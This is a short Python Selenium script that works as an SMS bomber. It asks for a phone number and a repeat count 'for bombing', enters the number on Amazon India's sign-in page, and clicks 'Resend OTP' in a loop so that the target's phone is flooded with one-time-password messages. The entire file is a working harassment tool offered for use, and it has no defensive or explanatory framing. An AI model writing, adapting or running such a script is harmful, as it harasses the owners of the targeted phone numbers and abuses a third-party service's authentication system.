from selenium import webdriver
Phno=input("Enter phone number:")
n=int(input("Enter the number of times for bombing:"))
browser=webdriver.Chrome("C:\\Users\\chromedriver.exe")
browser.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3F_encoding%3DUTF8%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
box=browser.find_element_by_id("ap_email")
box.send_keys(Phno)
press=browser.find_element_by_id("continue")
press.click()
otp=browser.find_element_by_id("continue")
otp.click()
for i in range(n-1):
	resend=browser.find_element_by_link_text("Resend OTP")
	resend.click()
